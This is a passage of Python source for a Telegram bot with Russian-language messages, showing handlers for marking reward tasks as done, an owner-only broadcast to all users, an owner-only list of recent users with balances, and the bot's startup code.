            f"Пользователь: @{callback.from_user.username or 'нет'}\n"
            f"Задание #{task_id}\n"
            f"Награда: {CURRENCY}{reward}\n\n"
            f"Проверь и начисли баланс через /admin",
            parse_mode="Markdown"
        )
        
        await callback.message.edit_text(
            f"✅ Задание отмечено как выполненное!\n"
            f"Админ проверит и начислит {CURRENCY}{reward} в ближайшее время."
        )
    else:
        await callback.answer("Активных заданий не найдено", show_alert=True)
    
    conn.close()

@dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast_start(callback: types.CallbackQuery, state: FSMContext):
    """Начало рассылки"""
    if callback.from_user.id != OWNER_ID:
        return
    
    await callback.message.edit_text(
        "📢 *Рассылка*\n\n"
        "Введи текст для рассылки всем пользователям:",
        parse_mode="Markdown"
    )
    await state.set_state(AdminStates.waiting_for_broadcast)

@dp.message(AdminStates.waiting_for_broadcast)
async def admin_broadcast_send(message: types.Message, state: FSMContext):
    """Отправка рассылки"""
    if message.from_user.id != OWNER_ID:
        return
    
    text = message.text.strip()
    
    # Получаем всех пользователей
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    users = c.execute('SELECT user_id FROM users').fetchall()
    conn.close()
    
    sent = 0
    failed = 0
    
    await message.answer(f"📢 Начинаю рассылку {len(users)} пользователям...")
    
    for user in users:
        try:
            await bot.send_message(user[0], text, parse_mode="Markdown")
            sent += 1
            await asyncio.sleep(0.05)  # Anti-flood
        except:
            failed += 1
    
    await message.answer(f"✅ Рассылка завершена!\nОтправлено: {sent}\nНе доставлено: {failed}")
    await state.clear()

@dp.callback_query(F.data == "admin_users")
async def admin_users_list(callback: types.CallbackQuery):
    """Список пользователей"""
    if callback.from_user.id != OWNER_ID:
        return
    
    conn = sqlite3.connect('fullworko_bot.db')
    c = conn.cursor()
    users = c.execute('''SELECT user_id, username, first_name, verified, balance, reg_date 
                          FROM users ORDER BY reg_date DESC LIMIT 20''').fetchall()
    conn.close()
    
    text = "👥 *Последние 20 пользователей:*\n\n"
    
    for user in users:
        user_id, username, name, verified, balance, reg_date = user
        status = "✅" if verified else "❌"
        time = datetime.fromisoformat(reg_date).strftime("%d.%m %H:%M")
        text += f"{status} {name} (@{username or 'нет'})\n"
        text += f"ID: {user_id} | {CURRENCY}{balance:.2f} | {time}\n\n"
    
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=back_to_main_keyboard())

# ================== ЗАПУСК ==================
async def main():
    logger.info("Bot started")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
